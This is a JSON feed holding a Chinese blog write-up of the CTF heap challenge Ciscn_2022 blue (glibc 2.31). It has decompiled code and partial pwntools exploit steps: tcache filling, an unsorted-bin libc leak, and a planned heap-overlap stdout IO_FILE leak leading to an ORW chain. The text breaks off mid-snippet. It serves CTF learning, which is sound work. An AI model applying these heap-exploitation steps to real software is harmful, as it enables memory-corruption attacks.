{
    "version": "https://jsonfeed.org/version/1",
    "title": "null • All posts by \"堆拓展攻击\" tag",
    "description": "欢迎来到Huan的笔记空间~~~~~~🌸",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2024/06/21/Ciscn-2022-blue/",
            "url": "http://example.com/2024/06/21/Ciscn-2022-blue/",
            "title": "Ciscn_2022_blue",
            "date_published": "2024-06-21T08:46:04.000Z",
            "content_html": "<h1 id=\"ciscn_2022-blue\"><a class=\"markdownIt-Anchor\" href=\"#ciscn_2022-blue\">#</a> Ciscn_2022 blue</h1>\n<blockquote>\n<p>前言：一道 2.31 的 glibc 堆题（国赛将至，复现一下吧</p>\n</blockquote>\n<h2 id=\"了解程序\"><a class=\"markdownIt-Anchor\" href=\"#了解程序\">#</a> 了解程序</h2>\n<p>首先需要检查程序保护</p>\n<h3 id=\"保护全开\"><a class=\"markdownIt-Anchor\" href=\"#保护全开\">#</a> 保护全开</h3>\n<p><img data-src=\"D:/%E7%AC%94%E8%AE%B0/picture/Untitled/image-20240621141324623.png\" alt=\"image-20240621141324623\"></p>\n<p>Ida 分析一下程序</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> __fastcall __noreturn <span class=\"token function\">main</span><span class=\"token punctuation\">(</span>__int64 a1<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>a2<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>a3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-4h]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">sub_1730</span><span class=\"token punctuation\">(</span>a1<span class=\"token punctuation\">,</span> a2<span class=\"token punctuation\">,</span> a3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>      <span class=\"token function\">sub_18D5</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 菜单，无 edit</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>      v3 <span class=\"token operator\">=</span> <span class=\"token function\">sub_12A8</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//str_2_int</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">!=</span> <span class=\"token number\">666</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      <span class=\"token function\">sub_1663</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">></span> <span class=\"token number\">666</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>LABEL_13<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      <span class=\"token function\">sub_1289</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid choice\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">==</span> <span class=\"token number\">3</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>      <span class=\"token function\">sub_14C5</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//show</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">></span> <span class=\"token number\">3</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_13<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token function\">sub_138A</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//add</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>      <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">!=</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>          <span class=\"token keyword\">goto</span> LABEL_13<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token function\">sub_1592</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//dele 无 UAF</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"sub_1730开启沙盒\"><a class=\"markdownIt-Anchor\" href=\"#sub_1730开启沙盒\">#</a> sub_1730 (开启沙盒)</h3>\n<p><img data-src=\"D:/%E7%AC%94%E8%AE%B0/picture/Untitled/image-20240621141506838.png\" alt=\"image-20240621141506838\"></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>__int64 <span class=\"token function\">sub_1663</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-4h]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> dword_4070 <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span><span class=\"token comment\">// 只能使用一次这个函数</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ERROR\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token function\">_exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">sub_1289</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Please input idx: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  v1 <span class=\"token operator\">=</span> <span class=\"token function\">sub_12A8</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v1 <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0x20</span> <span class=\"token operator\">&amp;&amp;</span> dword_4180<span class=\"token punctuation\">[</span>v1<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;&amp;</span> qword_4080<span class=\"token punctuation\">[</span>v1<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>qword_4080<span class=\"token punctuation\">[</span>v1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 存在 UAF</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token operator\">++</span>dword_4070<span class=\"token punctuation\">;</span><span class=\"token comment\">//delete_count</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">sub_1289</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"DONE!\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token function\">sub_1289</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ERROR\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0xFFFFFFFFLL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-4h]</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> dword_406C <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span><span class=\"token comment\">// 同样只能 show 一次</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ERROR\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token function\">_exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  <span class=\"token function\">puts_0</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Please input idx: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  v1 <span class=\"token operator\">=</span> <span class=\"token function\">str_2_int</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v1 <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0x20</span> <span class=\"token operator\">&amp;&amp;</span> dword_4180<span class=\"token punctuation\">[</span>v1<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;&amp;</span> qword_4080<span class=\"token punctuation\">[</span>v1<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token function\">puts_0</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>qword_4080<span class=\"token punctuation\">[</span>v1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token operator\">++</span>dword_406C<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">puts_0</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Done!\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>  <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token function\">puts_0</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ERROR\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> __fastcall __noreturn <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>a1<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>a2<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>a3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-4h]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">int_secc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>      <span class=\"token function\">meau</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>      v3 <span class=\"token operator\">=</span> <span class=\"token function\">str_2_int</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">!=</span> <span class=\"token number\">666</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      <span class=\"token function\">uaf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">></span> <span class=\"token number\">666</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>LABEL_13<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      a1 <span class=\"token operator\">=</span> <span class=\"token string\">\"Invalid choice\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>      <span class=\"token function\">puts_0</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid choice\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">==</span> <span class=\"token number\">3</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>      <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">></span> <span class=\"token number\">3</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_13<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>__int64<span class=\"token punctuation\">)</span>a1<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>__int64<span class=\"token punctuation\">)</span>a2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>      <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">!=</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>          <span class=\"token keyword\">goto</span> LABEL_13<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token function\">dele</span><span class=\"token punctuation\">(</span>a1<span class=\"token punctuation\">,</span> a2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"D:/%E7%AC%94%E8%AE%B0/picture/Untitled/image-20240621142032888.png\" alt=\"image-20240621142032888\"></p>\n<p>可见程序只 ban 了 execve，还是比较简单的。</p>\n<blockquote>\n<p>存在沙盒，一般我想到的是去利用 env 去泄露栈地址，然后再去劫持返回地址。</p>\n<p>只需要将 orw 写到返回地址上即可。</p>\n</blockquote>\n<h2 id=\"思路规整\"><a class=\"markdownIt-Anchor\" href=\"#思路规整\">#</a> 思路规整</h2>\n<p>show 只有一次，那如何即去泄露 libc 地址，又去泄露 stack 地址呢？显然想要 show 两次是不合适。第一次 show 只能是泄露 libc，因为去泄露 libc 之后才能得到 env。</p>\n<p>所以可以将 tcache 打满，然后利用 unsortedbin 去泄露 libc</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'Leaklibc'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'gep'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>uaf<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>show<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>__malloc_hook <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">96</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>libcbase <span class=\"token operator\">=</span> __malloc_hook <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>success<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libcbase<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>而第二次我们需要去泄露 env，但是 uaf 和 show 都用过一次了，那如何去利用呢。</p>\n<p>那么就需要去了解一下 IO_FILE 了，stdout。<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjAyMjM3L2FydGljbGUvZGV0YWlscy8xMTM4NDUzMjA=\">好好说话之 IO_FILE 利用（1）：利用_IO_2_1_stdout 泄露 libc_libc 泄露方式 - CSDN 博客</span></p>\n<p>这篇文章已经写的很详细了。</p>\n<p>从此文中，我们可以将 fake 一个堆块到_IO_2_1_stdout，然后将其 Flags 改成 <code>0xfdab1800</code> ，再将 _IO_write_base 改成我们想泄露的地址的 <code>起始地址</code> ，最后把 _IO_write_ptr 和 _IO_write_end 改成泄露地址的 <code>终点地址</code> 即可。</p>\n<p>但是程序当中已经没有 uaf，那如何在去控制 fd 去做我们的 fake_chunk 呢？</p>\n<p>利用 tcache 去做是比较简单的。那如何去利用呢？</p>\n<p>对，使用堆拓展攻击即可。</p>\n<p><img data-src=\"D:/%E7%AC%94%E8%AE%B0/picture/Untitled/image-20240621145849635.png\" alt=\"image-20240621145849635\"></p>\n<p>这是此时 bins 链表。所以我们需要修改一下泄露 libc 的代码，要不然无法进行堆拓展攻击</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'Leaklibc'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'gep'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token 